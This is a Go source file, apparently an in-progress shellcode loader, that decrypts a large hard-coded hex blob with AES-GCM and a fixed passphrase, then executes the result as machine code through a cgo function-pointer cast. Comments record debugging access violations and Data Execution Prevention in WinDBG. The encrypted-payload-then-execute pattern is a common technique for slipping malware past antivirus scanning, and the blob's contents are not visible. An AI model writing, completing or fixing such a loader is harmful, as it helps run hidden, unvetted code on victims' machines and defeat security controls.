
package main
/*
call(char *code) {
    int (*ret)() = (int(*)())code;
    ret();
}
*/
import "C"
import "unsafe"
import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
)
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	dat := "98706733393e4b402cc710a91e3378ed88293958fd024b193c80ab9a58a4ec79ba027148dc8e578e8e90a0c5ee703dfd7254adc0cdb1c95d3678462c08b71271fd1770346f10c444ea5c0bf7cc7a40621d61d421da4c455d5b507c162dc9fb16aa2a516d512d48204e8b7216a1911052400b3cbf1f9ce8b3c9d0360057ca37d24cdd49df6c38b73e9a62cc80866f36769211d036f7d7a29f2adeedd5a36903423ef4cb399e20e848eb2a46aca5bd0d247a2b83d7259a4673643176b465ea4d3f54a3d92ccd6e1e2e40d897070f6c941ba5888657a704b6b441d244123b4e4c7e280d15cf8f1b0dc7193cdd0543695058ec865809c34aca775da6367500f402e9396839aee8e94bf526316fc6cef2c62545168661eed51630cb6b52bc5bbf43736eab233a280cc8d7edb95be39232d5f46422107476a4d18c8eb11922284b02dea35277589051450de090725356fa813436d3b70298e14e8a5fa30bacd52b8ad70e506b4c5f0c969e3cbabb39bc105b40c4575711e1cc95376253f4edf50da36ab9b2dacc6443007b38c6cea0a13fd1f609a4acb77d0fa7fbccef4cc1f36e3c5009e1ed07a664006854cae32d1eef393a277a1a06792b15cc60371601f75faa569f3875e62f0eea7657a75e78b9265fada8b937b0a079c303c46e23769c00cb56cfbc1459a1fc1947c0450824273f659c920c15f304dfa28c284cb2bce197cfb5ed7a3f6a222b09015103b76d3e2608afcfb3bce7ed6d5a7eb3f42ce97cf4330ea94a25883b5e6cdf889d0800ec2ad6a732af14de6c8d8adaaa4d940909ca6cc6c9a03df77c68b97737fb2f7fac2553a84bc1edf80a43915de4dd97b22814182933df304c6f47ff94da622df83d2e6b3fbfc5b9d1d18478a4758d5195d8cc2f95ed3d965c85b46edc284e27a0a16fb5951d1298b53673797ff2aa335d9e80ea422f2f26397f83fd4b2bcf39a87f89d030c25bb16fe5fd48a5c9750afc98308e295a69597c644a0090efb7947d0cd3a9da37f46951b372c8cc3a6faaccaf07f03a77e1ce23e792da11a1bc1cb8faeed7c9b610f640704c3a0fb9ef603d3e0492a5845af5b5e0bb28d958946c36310f461c8ef82162ebc441669c8a0bccacffef86324ec2db56133c5771f446256bb9dc94a324a4a7c3128540af4a3a0dcaed0cdbf6820c1af9a23ca6c03488ae2f2f8453e33832258c172b164643bb5b4dda7db251463833d3226022ab01c02d8c0be02eb93501d85fee3529a4ec7dade59d44d6bbaca50d105cf4c5876375e20ad6b37bf15dcdc88224d6e9248f95375d296bea3b22371f2ac41470d136bbdef59d1c50b1e1f7621b9769fbd737341f1d46adb0061d949ed14eb2613cabd6d676bceaf8b65ba636267d752b5fa4432c57ed3e2b368973122531e69684f9f31964b02e89160a482454bab4b7581d52f295490add7cfd39061b00b45aa941ee0cad9e703c8c777455dc850afed60c2da1c12d5e6a4d5307f05c68c47fb4b41edb1750f45176bf539a857d86c75780168659bb9a35bb3bb307b28cac068746b26421b5eeca425d96ce90166932ce12cd98060e49f6589abe0810fd78e540385a82d4566db5bc15c0701e4ae768e5ba8f938a0904d062bbd11d44e3c87b201ac0d91803eca001ea52cba88a1f3152e870f4d77e38c9b87b909d35bfef65dad692d03958efaa5933ee4c1f38e55e761dfbbac958487b32547b991f4ef0bbe7374355376bd79689dce3bcae5592ada558f3505046f724a5af9723d0cbcd9fd77cf61915c8de64d63c81bc3e8541e835ea8fd5bfcb46ade2fd47be5fda7e3a4d9f0124bc154ed0e24cd306b6324360967547c4ceb2974989cf1df7253c0ade616bedf8effa7e70b0dce524bf06a40e8faa83869f1e343f5c7bba439060a43f2032e1258f1295ae3e1f1332dfce0b2866a0569ee4acbf51f2ffece52d8166a590b1f92cecc9d6c5a1a6cf757f7da7fd21dfdb7071284b95293c4ec1f1756ce51c1391dc655f688623785523ddfe76d6a95cfa4e92eeb38b13c54fd53caedfab7ceb719da1e185257d50de84de9f39a55fb6ed17e1dcdf11c318c2020272d63fcb4d2364ed4c0495aa25b246e2db96a28bf3f57f2ebd791197c003f54281960b9d949655bd603a14e2133f3dbca90f22b7193aea964cf2b178e821d3568476c14110944139bba37b74ed7e51e399795ff33ee70b5042aa949f7e51363dca6b9a8df1be4bf714c06fec86d95e7decc79dd0dfa9644dac04d3ed0ea98582a85467e4be8e354a6f225856518bedd07d54b9e971621827887de8e665d78c5024c4a035dc8ffa5318f791c547691dd40b4c6aa021ae404f013b1396fa01e36e12f06a8f47e5c7f4c52d2d02c16762ddbd9e66ce64dd04dc46d361c79f6d46e63cc8847b66db45641250401c7d4bd2b647d1a90d438fa702939b68a73a444203d8fbce83d3a7f892c08de92d773ae448ddc5c36f1d99b63cdcba2952c057f9e3bb38ed100eab065541edb96bb18e876802add4bbfc54571b81534cf4e00ff43613f896642de1da894fb764143ebabd89d6d07b30b84d2ba0cd3f35f29bce2522fc37f32e3daa0fce3cf6527def2899c69d6d9d5bf25c2a4b5223b676757ddc1d268e2b070d1a994de29896ba30323b17a3a2cd5930819339ce071dad15da6fa23670e09b3f55cc424092639d0659fa00c7c4ee0de9c6aabd1f1a475a88c32fbdb31f2436ef0060549fb7b52609ae2d2a86e83beda864af9a4daec220dc55db4e90448b7d7d1458c61fed89e3481bff54a7bf7e5823b10fadb13c54abc35050859d98399485e1577368b5e258ea8494e1628a05ffcf4a61c138ffda522b992a962fc7ca819edaa1f27535c6b9d06fefb9aaf880a394871ad27a0f9e785240c6f727deaa752928ee2b9f17982e07ec1c086e10e1040fd611920dff040c01a60c0c5f7be0e1778dca7a0dae0320982e3ec37f20b33bb8d852ab83893e16668e87856b089264344859fa14f2f92c574eabb8c537488b1ffdb352c7baa0622d1a848387144a0b19915c0000382d8af06993e0c0aaad018d5795b5f6e93ecf602ce16ef87422319aaa64fb40b62fb70703c4c32717ec1007a12b8447c302bebced2cd85ef3bcabe61e516d65c11a10ae05cf2dab817749cb9f346a93ed6f4a8cf56bee2ed13d43696d084c383faa2d94a62e10199b8f773ff468f6666ac6ad4afac45880f14c60a39560a235d2c24cec98eac0cfd7067013a5297fe31ae9cba31bac215c0a17a71ddc8198d14d8ada1938801d82ae497e71580ac881e34d05b0e0b9118693c7ea67c268c2b89976d94a7ddc4339c2411a094289dc766d69ec63099c59af97131424670846eec6a95dbf32c615ac419e851d62fa902ae30605081a1e386a6db4c7e1d19361261e806128d4cf42682db8c43bf6d8d97de74fcd65fdb710b09a36f23d60fe2b00dd02561f5d7d24617f0ab6a550e3e905e1cabdd307755c1bbb4bfa4c9ca811b72a82ed1da0c336387349d714a0da18da469b548b0269d5de357e33d881cd5f9e6c249fb02ea7c8ed3f0e0fecf731506dfcc09f6598aaffcf5587c0c8dc9bd2db75198691ffafa29a1c1323cc22831500f332021800ac1d06eaecdc30763a3f8ebdc7c742731cd4545c0e7d8c4c17bb80f8d5bafa380ebe04e6a99be564ca745a1fa66610f844f050a588280a9df53c0c3ce04d6ac3b9a037ad4ab815f62b4743b80ee029b668ac89cce4d88d68e6d5be4f3657f40a5d10d96c1892cb1e720ffc6e2b33215daefe225a1e24e3853d06b6bf3cc1b384fac9dfa951c1f76d6a88c7bab3c4bb96dd9745ca17e8b6522ae9616cc3eacb6c14237ec088d4924513119fdfe38271b5d143e4202e893d7c6f0ae32f4dfe3a5fd46cdc0f40b99b8b6191f86aded83579e562998ad2ff0fd466e4b6d59f8a4f899c9c9186686d3ac7aab9bd0705cee3cc13fd8b81b04d0a55127c57789f921ae2a64ddd5f10f8cd62bfedb52ae358c58d9cd8421615bd3543d5751fc3f470126ec0aff6832cf69d5ef901bad921ff6a5e48e205da5ddee88b41944c4a5bdf2e70f57b1c525037624c9911a2061eaa68cd2717b06755004e0e5d0c90eefa1bc7688bce5e1bff520eb7e64ef9f071b65f16e8ccd0811fe74c89ac881bb091128d0a1bae8282bf31b0d39f8bbe506062eba06c2b79a6009f9de3e535c3b0a456889f14ef2e38daf172637b6ecf4f2fb3cbaa0334a518eca92a04e61d29591f940bba07538ba21c1052cb52e4579593dce7a68251b3c57c71fea1d4622814e740c0701942e4622ece1d1aca736fe200dad2be40609f71a69af89f1f209d82b00b1c3529fba7c5b67d31feb6acf950a66f2786f9d8b9eb122edbfb1e696b6a223a9d23196cace80794b608008ca592f8cd12d9605af3ab7ac1d33bfa25b84f72c72c78caa83f3cdeadef18e067c4a6d7acc150d32a1f5b890efce77f4f150b59ff40beb415954208831da5295e43a2320eba3c13f0308a61c2ee21df5db2d118e0f30b60faeb6638362be51a96094baca644d5a759442b56fe2f8e297850119e23ea07943f07aeb35cdc5df526068f4032da60b0170733b612de83731fcd15a9c9e86715f7ce70ab5c5adf9e46dc18d32b7cceb6912c1447eb153e173e834b6a4cccea56d635d762b617755e3c868c37fcf7fe448fc6251348589427c4968684e94ab4bdf74445b16e5643199fe8eb1120ecb1dffd6a8bc7a98e0cd9bc2f3c026ab18e63a08cd2cebba29f0f88853b68ce1171b631da309e19835e65d29d37dd445d467dc3e0ea0879e8047426e910205bebfc2d7e8671247d142d418ea6866651858c227aef4a45871e6675fd8b48dbac03c0ae3658ac1322a03177b29c912018e63a93de8fb95ae9d92138737955491b3fd9841c0ae747ef22b7a9c59e5ad10ec71dae014185aadb5d4a0ad8e6cb2bbe3cdf9eacb858bf95443eab4eb68e9897fc3e0c8fbb8f27cad16e85069fb1a1c9042354f088fe5b2ca50fee5a7b9fb7fbf979d9a10f4f3ecf98d1b209b66a7d76a77e545effea55970f00d77353ce1a1442320324e13df30921a7ba7c72011e8868c3ab4f3b26f00bb82cfc26555f535e8ae650d89331632c8f4390415b84914c50d5c77ccc45d742d5e2a71541f18312a7d346611f1f9a838786534f49c74abb203a6584419cbfe114cbf1a9a25d67f6303288901f3d98f172e39fdafab3b096a27a1a3c9226a00c65a623f0dd10803e8518fd58c7aa65782ad201454c69518cad5f9f9a5e90b3"
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), "asdioashndand")
	/*Shellcode is correctly decrypted*/
	// Note: After the decryption process, we need to just add it as a string here, and have this function typecast it into bytes.
	var shellcode = []byte(decryptedDat)
/*
Now we are hitting access violations. exit status 0xc0000005, check for DEP in WinDBG
*/
	C.call((*C.char)(unsafe.Pointer(&shellcode[0])))

}